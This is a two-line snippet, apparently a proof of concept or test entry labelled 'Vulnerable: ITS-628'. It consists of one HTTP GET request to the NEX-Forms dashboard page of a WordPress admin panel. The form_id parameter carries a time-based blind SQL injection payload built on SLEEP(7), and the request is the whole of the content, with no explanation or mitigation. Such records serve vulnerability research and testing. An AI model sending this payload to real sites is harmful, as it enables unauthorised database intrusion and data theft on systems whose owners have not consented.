# Vulnerable: ITS-628
GET /wp-admin/admin.php?page=nex-forms-dashboard&form_id=1+AND+(SELECT+42+FROM+(SELECT(SLEEP(7)))b)--
